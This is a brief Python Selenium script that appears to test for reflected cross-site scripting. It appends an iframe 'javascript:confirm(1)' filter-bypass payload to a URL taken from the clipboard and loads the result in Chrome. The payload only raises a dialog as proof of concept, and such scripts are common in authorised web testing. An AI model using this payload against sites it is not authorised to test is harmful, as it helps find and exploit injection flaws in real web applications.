from selenium import webdriver
import os
import pyperclip as pc
driver = webdriver.Chrome(executable_path="5.exe")
driver.maximize_window()
driver.get("{}<input value=<><iframe/src=javascript:confirm(1)".format(pc.paste()))
